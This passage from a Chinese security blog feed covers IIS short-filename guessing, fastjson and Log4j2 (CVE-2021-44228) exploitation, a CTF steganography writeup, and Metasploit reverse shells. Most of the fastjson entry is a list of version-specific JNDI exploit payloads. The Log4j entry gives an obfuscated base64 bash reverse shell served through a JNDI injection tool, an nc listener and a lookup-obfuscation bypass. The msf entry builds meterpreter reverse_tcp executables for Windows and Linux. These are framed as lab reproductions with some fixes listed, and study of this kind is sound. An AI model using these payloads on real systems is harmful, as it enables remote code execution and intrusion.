<p>/xxx.xxx.xx.xx/A*~1/xxx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当访问构造的某个存在的短文件名，会返回404</span><br></pre></td></tr></table></figure>



<p>/xxx.xxx.xx.xx/AB*~1/xxx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当访问构造的某个不存在的短文件名，会返回400；</span><br></pre></td></tr></table></figure>



<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。 </p>
<p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
<p>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。 </p>
<p>以下通过开启IIS6.0 ASP.NET后进行复现。</p>
<p>（参考网上）</p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>fastjson漏洞</title>
    <url>/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>fastjson是alibaba开源的一个json解析库，将java对象和JSON格式字符相互转换。 </p>
<p>jackson也有这样类似功能。Spring MVC 默认采用Jackson解析Json</p>
<p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
<h3 id="原理解释："><a href="#原理解释：" class="headerlink" title="原理解释："></a>原理解释：</h3><p>在请求包里面中发送恶意的json格式payload，漏洞在处理json对象的时候，没有对@type字段进行过滤，从</p>
<p>而导致攻击者可以传入恶意的TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据</p>
<p>这个_bytecodes生成java实例，这就达到fastjson通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>配置环境配了两个小时。。。各种报错</p>
<p>maven环境：<a href="http://maven.apache.org/download.cgi">http://maven.apache.org/download.cgi</a></p>
<p>idea 创建maven 项目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pom.xml引入fastjson依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.2.62&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>

<p>然后处理各种报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pom.xml 加入</span><br><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;.</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>

<p>然后配置tomcat:<a href="https://tomcat.apache.org/download-90.cgi">Apache Tomcat® - Apache Tomcat 9 Software Downloads</a></p>
<p>Edit Configurations 配置：</p>
<p><img src="/2022/04/17/fastjson%E6%BC%8F%E6%B4%9E/image-20220417224659876.png" alt="image-20220417224659876"></p>
<p>然后配置Project Structure ：<a href="https://blog.csdn.net/weixin_44579869/article/details/121647812">(28条消息) IDEA出现Please,configure Web Facet first的解决方式，或者是Servlet启动后 404_扶她小藜的博客-CSDN博客_idea please</a></p>
<p>参考：<a href="https://blog.csdn.net/lchmyhua88/article/details/116535988">(28条消息) 在IDEA中创建maven项目，使用Fastjson 介绍json转换_华大哥的博客-CSDN博客_fastjson idea</a></p>
<p>复现log4j2 的时候也用到了下面两个请求方式</p>
<h3 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h3><h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><h1 id="Fastjson-多版本payload集合"><a href="#Fastjson-多版本payload集合" class="headerlink" title="Fastjson 多版本payload集合"></a>Fastjson 多版本payload集合</h1><p>copy的零组文库</p>
<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-24"><a href="#fastjson-lt-1-2-24" class="headerlink" title="fastjson&lt;=1.2.24"></a>fastjson&lt;=1.2.24</h3><p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1099/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-41"><a href="#fastjson-lt-1-2-41" class="headerlink" title="fastjson&lt;=1.2.41"></a>fastjson&lt;=1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://x.x.x.x:1098/jndi&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-42"><a href="#fastjson-lt-1-2-42" class="headerlink" title="fastjson&lt;=1.2.42"></a>fastjson&lt;=1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-43"><a href="#fastjson-lt-1-2-43" class="headerlink" title="fastjson&lt;=1.2.43"></a>fastjson&lt;=1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p>exp：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-45"><a href="#fastjson-lt-1-2-45" class="headerlink" title="fastjson&lt;=1.2.45"></a>fastjson&lt;=1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,<span class="attr">&quot;properties&quot;</span>:&#123;<span class="attr">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://localhost:1399/Exploit&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;a&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="attr">&quot;b&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.x.x.x:1999/Exploit&quot;</span>, </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h3><p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="attr">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>

<p>影响版本：</p>
<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
<p>exp：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="attr">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="attr">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="attr">&quot;properties&quot;</span>: &#123;</span><br></pre></td></tr></table></figure>





<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p><a href="https://www.sec-in.com/article/950">浅谈fastjson waf Bypass思路-SecIN (sec-in.com)</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)</a></p>
<p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
<p>零组文库</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j2远程代码执行漏洞</title>
    <url>/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）"><a href="#Apache-Log4j-2远程代码执行漏洞（-CVE-2021-44228）" class="headerlink" title="Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）"></a>Apache Log4j 2远程代码执行漏洞（ CVE-2021-44228）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就<code>Java的日志记录工具</code>。该工具重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
<p>log4j2中存在<code>JNDI注入漏洞</code>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上<code>执行任意代码</code>。</p>
<a id="more"></a>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>攻击者可以通过 log4j 的 lookup 替换功能向其配置文件的任意位置注入代码（类似 SQL 注入，把 变量替换为{实际代码}），再加上这些版本中用到的 JNDI 特性并没有为 LDAP 提供足够的保护，使得注入的任意代码都能被执行。</p>
<p>先说下利用exp：${jndi:rmi://127.0.0.1:1099/exp}   (rmi/ldap ，两者部分功能类似，但也有不同点)      再直白点来说就是 用户提交的${jndi:rmi://127.0.0.1:1099/exp} ，被日志捕获到，然后如果log4j2 又开启了 Jndi Lookup功能，就能解析用户提交的exp，发送rmi请求，远程调用一些反序类化的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JNDI：Java 命名与目录接口，提供了用名称来访问资源的能力</span><br><span class="line">LDAP：轻型目录访问协议，定义了如何访问目录服务中的内容</span><br><span class="line"></span><br><span class="line">两者配合，可以完成对服务器目录的操作，比如增删改查。</span><br></pre></td></tr></table></figure>



<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
<li>Apache Log4j 2.x &lt; 2.15.0-rc2</li>
<li><strong>供应链影响范围</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line"></span><br><span class="line">Apache Struts2</span><br><span class="line"></span><br><span class="line">Apache Solr</span><br><span class="line"></span><br><span class="line">Dubbo</span><br><span class="line"></span><br><span class="line">Redis</span><br><span class="line"></span><br><span class="line">Logstash</span><br><span class="line"></span><br><span class="line">Kafka</span><br><span class="line"></span><br><span class="line">Apache Flink</span><br><span class="line"></span><br><span class="line">Apache Druid</span><br><span class="line"></span><br><span class="line">ElasticSearch</span><br><span class="line"></span><br><span class="line">Flume</span><br><span class="line"></span><br><span class="line">等</span><br></pre></td></tr></table></figure>



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞环境：vulfocus(<a href="http://vulfocus.fofa.so/#/dashboard">http://vulfocus.fofa.so/#/dashboard</a></p>
<p>vulfocus.fofa.so:44873</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002417059.png" alt="image-20211213002417059"></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><code>漏洞验证</code></h4><p>打开<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a>  get subdomain</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002813058.png" alt="image-20211213002813058"></p>
<p>输入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;ip&#x2F;exp&#125;</span><br><span class="line"></span><br><span class="line">payload  这个参数名字不能错</span><br><span class="line">ip暂时换上对应域名</span><br></pre></td></tr></table></figure>



<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213002723533.png" alt="image-20211213002723533"></p>
<p>返回dnslog，refresh一下，可以看到记录，说明，请求了该域名，证明漏洞可能存在（极大几率）</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213003146701.png" alt="image-20211213003146701"></p>
<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><code>反弹shell</code></h4><p>需要<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">jndi注入工具</a>构造反弹shell命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line">-C - 远程class文件中要执行的命令。命令会被作为参数传入Runtime.getRuntime().exec()，所以需要确保命令传入exec()方法可执行。</span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;1.1.1.1&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzEwMDE1IDA+JjE=  是反弹shell的base64加密   只需要修改成反弹到vps的ip端口</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213004824709.png" alt="image-20211213004824709"></p>
<p>-A “1.1.1.1”   1.1.1.1换成自己vps的ip</p>
<p>在vps上启动 JNDI-Injection-Exploit，这里生成的有 JNDI链接，一会使用最后 JNDI链接，其他的没有成功 （确保 <strong>1099</strong>、<strong>1389</strong>、<strong>8180</strong>端口可用，不被其他程序占用）</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013010020.png" alt="image-20211213013010020"></p>
<p>再开个框，对我们反弹shell的端口进行监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvnp 10015</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213005641455.png" alt="image-20211213005641455"></p>
<p>payload=${jndi:ldap://ip/exp} 修改为 payload=${jndi:rmi://106.xx.xx.xx:1099/jwbmm8} (ldap://ip/exp替换成生成的 JNDI链接，上面生成的有)</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012806412.png" alt="image-20211213012806412"></p>
<p>复现时间超时，靶场端口变了，不影响</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013101617.png" alt="image-20211213013101617"></p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012602963.png" alt="image-20211213012602963"></p>
<p>成功反弹shell</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213012641273.png" alt="image-20211213012641273"></p>
<p>找到flag</p>
<p><img src="/2021/12/13/log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20211213013340992.png" alt="image-20211213013340992"></p>
<p>注意：vps对应端口一定要开放，</p>
<hr>
<p><a href="https://mp.weixin.qq.com/s/IZVR33igxU1mhAQlow7C2Q">参考</a></p>
<p><a href="https://mp.weixin.qq.com/s/JtNoGVpDlom1kC3h9CoLTQ">参考1</a></p>
<p><a href="https://mp.weixin.qq.com/s/4On4wXxchioqIHTsCJPq3w">原理参考2</a></p>
<p><a href="https://mp.weixin.qq.com/s/IxXGcpjN6KkDGPQYPJXHTA">原理参考3</a></p>
<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h4 id="补丁之前"><a href="#补丁之前" class="headerlink" title="补丁之前"></a>补丁之前</h4><ol>
<li>可升级jdk版本至6u211 / 7u201 / 8u191 / 11.0.1以上，可以在一定程度上限制JNDI等漏洞利用方式。</li>
<li>关闭<code>lookup</code>功能，即：设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code></li>
</ol>
<h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
<p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;ip:port&#x2F;exp&#125;</span><br></pre></td></tr></table></figure>



<h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
<p>貌似又被绕过了</p>
<hr>
<p>下次分析下fastjson反序列化漏洞原理，和这个漏洞类似</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>mrctf2021</title>
    <url>/2021/04/18/mrctf2021/</url>
    <content><![CDATA[<p>自己太菜了，开始复盘。</p>
<p><img src="/2021/04/18/mrctf2021/0.png" alt="0"></p>
<h2 id="MISC-Real-Checkin"><a href="#MISC-Real-Checkin" class="headerlink" title="MISC-Real Checkin"></a>MISC-Real Checkin</h2><p>记录下这个零宽隐写，网上找的工具没有解出来</p>
<a id="more"></a>

<p>叮咚！你的好大儿zbr向你发送了签到码，请注意查收：‍‎‏‍‎‍‍‎‌‌‌‍‍‎‍‎‏‎‌‎‌‌‍‎‌‌‎‌‌‍‏‎‍‎‎‌‌‍‌‏‎‎‌‍‎‌‍‎‍‎‎‍‎‎‍‏‎‎‎‍‏‌H0Xh2vcqESOonvfZJLaVupnpD3guAeq8VeO1O932HXhvlBLY2F/DRh5BmEGeHyutT3uZVTYGA503bF6tVem31Eq1MEGYpNuMkfHQ8Pbpfski7hqkDZ4n48H5OdSmsiVC   一看是加密相关的内容，base64不对，不知道什么加密，后来出题方说是零宽隐写。</p>
<p>空格部分就是隐写的零宽字符，我们放虚拟机看下</p>
<p><img src="/2021/04/18/mrctf2021/1.png" alt="1"></p>
<p>群里师傅说直接说把隐写内容复制到<code>pyhon</code>里面直接用<code>zwsp_steg</code>库解密。 这里解密的内容一定要是空格那部分，而不是我想的&lt;200d&gt;&lt;200e&gt;…这部分。</p>
<p><img src="/2021/04/18/mrctf2021/1.1.png" alt="1.1"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ECB AES QQID 0RPADDINGd</span><br></pre></td></tr></table></figure>

<p>一看就是AES加密，EBC为加密模式，密钥就是qq号呗</p>
<p><a href="https://the-x.cn/cryptography/Aes.aspx">https://the-x.cn/cryptography/Aes.aspx</a></p>
<p><img src="/2021/04/18/mrctf2021/1.2.png" alt="1.2"></p>
<p>太菜了呜呜呜。</p>
<p><a href="https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/">https://tl2cents.github.io/2021/04/11/2021-MRCTF-WriteUp/</a> 网上也有其他师傅解法，大家参考。</p>
<hr>
<p>web没有写文章，waf，check_in还是好玩的。这里贴wp：<a href="https://www.anquanke.com/post/id/237917">https://www.anquanke.com/post/id/237917</a>  </p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>MRCTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>msf-端口转发-反弹shell</title>
    <url>/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p>这里借助的是免费的端口转发工具，来进行演示。</p>
<p><a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p>
<p><a href="https://console.uulap.com/app/login/?next=/">https://console.uulap.com/app/login/?next=/</a></p>
<p>都是有可以免费使用。</p>
<p>实验环境：</p>
<p>kali ：192.168.119.138   （内网）</p>
<p>对内网主机win/linux，反弹shell。</p>
<a id="more"></a>

<hr>
<p>这就涉及目标内网机器是否可以出网。反向连接reverse_tcp/正向连接bind_tcp</p>
<ul>
<li><p>reverse_tcp    目标主机可以出网，有些端口没有被拦截（不行换 80 443  8080，一般80端口不会拦截。）</p>
</li>
<li><p>bind_tcp          目标主机不可以出网，（开启主机关闭的端口，我们主动去连接）</p>
<p>参考：</p>
<p><a href="https://cloud.tencent.com/developer/article/1778292">https://cloud.tencent.com/developer/article/1778292</a></p>
<p><a href="http://www.voidcn.com/article/p-weuaffcv-bq.html">http://www.voidcn.com/article/p-weuaffcv-bq.html</a></p>
</li>
</ul>
<h2 id="反弹window-shell"><a href="#反弹window-shell" class="headerlink" title="反弹window-shell"></a>反弹window-shell</h2><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>tcp协议</p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.png" alt="1"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.1.png" alt="1.1"></p>
<h4 id="kali-msf"><a href="#kali-msf" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f exe &gt; zzz.exe           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.png" alt="2"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.1.png" alt="2.1"></p>
<h4 id="内网win"><a href="#内网win" class="headerlink" title="内网win"></a>内网win</h4><p>运行zzz.exe</p>
<h2 id="反弹linux-shell"><a href="#反弹linux-shell" class="headerlink" title="反弹linux-shell"></a>反弹linux-shell</h2><h4 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h4><p>和上面一样</p>
<h4 id="kali-msf-1"><a href="#kali-msf-1" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">show payloads  选择我们要使用的payload</span><br><span class="line"></span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f elf &gt; zzz.elf           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l1.png" alt="l1"></p>
<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l2.png" alt="l2"></p>
<h4 id="内网linux"><a href="#内网linux" class="headerlink" title="内网linux"></a>内网linux</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x zzz.elf   给执行权限</span><br><span class="line"></span><br><span class="line">.&#x2F;zzz.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l3.png" alt="l3"></p>
